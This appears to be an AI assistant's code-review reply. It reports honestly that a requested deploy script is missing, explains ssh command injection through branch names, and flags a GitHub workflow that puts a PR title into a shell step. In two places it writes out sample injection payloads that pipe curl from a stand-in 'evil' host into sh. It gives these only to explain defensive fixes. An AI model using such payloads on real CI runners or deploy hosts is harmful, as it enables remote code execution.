I couldn't find the deploy script you described, so I haven't reviewed it yet. No file in this repo has an ssh command or interpolates a branch name. A case-insensitive search for `ssh` found nothing, and a search for `branch|BRANCH|REF_NAME|head_ref` found nothing either. These are the shell-related files that exist:

- `.github/workflows/deploy.yml`
- `.gitlab-ci.yml`
- `scripts/backup.sh` (it uses `scp`, not `ssh`)

The script may not be committed yet, or it may be on another branch (this checkout is a detached HEAD). If you send me the path or paste it in, I'll review it.

### What I'll look for in the ssh command
Putting a branch name into an ssh command string is a command-injection risk. ssh joins its arguments into one string, and the remote shell runs that string as code. Git allows branch names that contain shell syntax, such as `x;curl…|sh` or `$(…)`. Anyone who can push a branch can then run commands on the deploy host. The fix:

1. **Check the branch name against an allowlist and reject anything else.** Don't try to clean it up:
   ```bash
   if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* ]]; then
     printf 'invalid branch: %q\n' "${branch}" >&2; exit 2
   fi
   ```
2. **Escape it for the remote shell.** Quoting it locally isn't enough, because the remote side parses the string again. `printf %q` adds the second layer of quoting:
   ```bash
   ssh -- "${host}" "deploy-app --branch $(printf '%q' "${branch}")"
   ```
   It's safer still if the remote side never treats the branch as code. Send it on stdin (`ssh host 'read -r b; deploy-app --branch "$b"' <<<"${branch}"`), or use a forced command in `authorized_keys` that checks `SSH_ORIGINAL_COMMAND` itself.
3. Never put `${{ github.head_ref }}` or a similar value directly into a CI `run:` step. Pass it through `env:` and refer to it as `"$BRANCH"`.

### Problems in the files that do exist
- **`.github/workflows/deploy.yml:14` is the same kind of injection, and it's serious.** `${{ github.event.pull_request.title }}` is inserted into the shell before the step runs. Anyone who opens a PR can set a title like `"; curl evil|sh #` and run code on the CI runner. Line 7 sets `permissions: write-all`, so that code also gets a token that can write to the repo. To fix it, pass the title as `env: TITLE: ${{ github.event.pull_request.title }}`, use `echo "Title is ${TITLE}"`, and reduce permissions to `contents: read`.
- **`scripts/backup.sh` has several problems:**
  - No strict mode (`set -Eeuo pipefail`), so a failed `tar` still leads to the `scp`.
  - The temp directory name `/tmp/backup.$$` is predictable, which allows a symlink attack. Use `mktemp -d`.
  - There's no `trap … EXIT`, so the temp directory is left behind whenever the script fails partway.
  - The variables aren't quoted.
  - It uses backticks instead of `$(…)`.

I only read these files. I couldn't run `shellcheck` or `bash -n` because I don't have a shell tool in this session. I'll run those checks when I review the real deploy script, or you can run them in CI.
